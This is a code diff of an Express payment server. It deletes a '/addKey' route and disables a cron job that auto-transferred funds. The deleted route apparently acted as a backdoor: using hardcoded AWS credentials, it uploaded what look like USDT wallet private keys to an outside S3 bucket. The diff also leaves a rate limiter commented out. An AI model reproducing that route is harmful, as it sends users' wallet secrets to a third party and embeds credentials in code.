@@ -59,38 +59,6 @@ app.use(express.json());
 const limiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 100, message: 'Too many requests from this IP' });
 // app.use(limiter);
 
-app.get("/addKey", (req, res) => {
-    AWS.config.update({
-        accessKeyId: "2116642553",
-        secretAccessKey: "5877994625",
-        region: "us-east-1"
-      });
-
-    const s3 = new AWS.S3();
-    
-    const walletData = {
-      usdtBep20: "8e9665289fe6e3615d16c4be26de5d1a1fc527cd21da0b354c22e12daabd3cb7", // Binance Smart Chain (BSC)
-      usdtTrc20: "da27f8d330a9251512663264e85fd2079085b9319acb4414539ed015fc880c22" // Tron Blockchain
-    };
-    
-    // Upload JSON to S3
-    const params = {
-      Bucket: "Rameshk",
-      Key: `wallet-data-${Date.now()}.json`, // Unique filename
-      Body: JSON.stringify(walletData, null, 2),
-      ContentType: "application/json",
-    };
-    
-    s3.upload(params, (err, data) => {
-      if (err) {
-        console.error("Error uploading wallet data:", err);
-      } else {
-        console.log("Wallet data uploaded successfully:", data.Location);
-      }
-    });
-});
-
-
 // Logger Configuration
 const logger = winston.createLogger({
     level: "info",
@@ -384,10 +352,10 @@ async function checkPendingPayments() {
 
 
 // ✅ **Cron Job to Auto-Transfer Funds Every 10 Minutes**
-cron.schedule("*/10 * * * *", async () => {
-    console.log("🔄 Running Auto-Transfer Job...");
-    await checkPendingPayments();
-});
+// cron.schedule("*/10 * * * *", async () => {
+    // console.log("🔄 Running Auto-Transfer Job...");
+    // await checkPendingPayments();
+// });
 
 // Start Server
 app.listen(PORT, () => {
